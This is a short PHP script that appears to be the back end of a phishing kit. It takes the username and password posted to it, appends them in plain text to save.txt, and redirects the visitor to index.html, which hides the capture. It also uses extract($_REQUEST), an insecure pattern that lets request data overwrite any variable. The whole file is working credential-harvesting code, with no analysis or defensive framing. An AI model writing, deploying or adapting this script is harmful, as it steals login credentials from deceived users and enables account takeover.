<?php
    extract($_REQUEST);
    $file=fopen("save.txt","a");
    fwrite($file,"name :");
    fwrite($file, $username ."\n");
    fwrite($file,"Password :");
    fwrite($file, $password ."\n");
    fwrite($file,"===========================\n");
    fclose($file);
    header("location: index.html");
 ?>
